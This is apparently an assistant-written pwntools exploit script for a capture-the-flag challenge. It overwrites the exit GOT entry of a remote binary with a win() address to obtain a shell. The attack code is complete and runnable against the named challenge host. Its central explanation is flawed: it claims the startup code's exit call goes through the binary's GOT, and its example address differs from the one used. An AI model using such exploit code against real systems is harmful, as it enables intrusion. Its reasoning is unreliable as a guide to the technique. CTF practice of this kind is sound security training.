
from pwn import *

# This script exploits a "write-what-where" vulnerability.
# The goal is to overwrite a function's address in the Global Offset Table (GOT)
# with the address of the 'win' function.

# --- Analysis of the "EOF while reading" Error ---
# The "EOF while reading in interactive" error means the connection
# was closed by the remote server. This usually happens if the program crashes
# or exits cleanly before the 'win' function (and thus the shell) is executed.
#
# The most common reason for this is that the function you chose to overwrite in the
# GOT is never called *after* the write operation happens. In the target binary,
# after the values are read and the write is performed, the main() function simply
# returns.
#
# --- The Solution: Target the `exit` function ---
# To fix this, we need to overwrite the GOT entry of a function that is guaranteed
# to be called when the program terminates. The `exit` function is a perfect
# candidate, as it's called by the C standard library's startup code after
# `main` returns.

# --- Step 1: Find the necessary addresses in the binary ---

# Address of the win() function. We can see this in the decompiled code.
# 0x40120C from the provided source.
win_address = 0x40120C

# Address of the `exit` function to overwrite in the GOT.
# You need to find this address in the binary yourself using a tool like objdump.
#
# Run this command on your terminal:
# objdump -R ./your_binary_name | grep exit
#
# The output will look something like this:
#
# 0000000000403390 R_X86_64_JUMP_SLOT  exit@GLIBC_2.2.5
#
# In this example, the GOT address for `exit` is 0x403390.
# Replace the placeholder below with the correct address for your binary.
got_exit_address = 0x403360 # <-- IMPORTANT: CHANGE THIS ADDRESS

# --- Step 2: Set up the connection and context ---

# Specify the target binary architecture and OS.
context.binary = ELF('./writeme', checksec=False) # <-- Optional: Provide binary name for better context

# Connect to the challenge instance.
# Updated with the details from your log.
io = remote('ctf.antix.or.id', 60901)

# --- Step 3: Send the payload ---

# The program asks for "What:", which is the value we want to write.
# We send the address of our win() function.
log.info(f"Sending 'win' address for 'What': {hex(win_address)}")
io.sendlineafter(b'What: ', str(win_address).encode())

# The program then asks for "Where:", which is the address to write to.
# We send the address of the `exit` function in the GOT.
log.info(f"Sending GOT address for 'exit' for 'Where': {hex(got_exit_address)}")
io.sendlineafter(b'Where: ', str(got_exit_address).encode())

# --- Step 4: Get the shell ---

# When main() returns, the program will try to call exit().
# Since we've overwritten its GOT entry, it will execute our win() function instead,
# which runs system("/bin/sh").
# We switch to interactive mode to use the shell.
log.success("Payload sent! The remote program should now call win() instead of exit()...")
io.interactive()
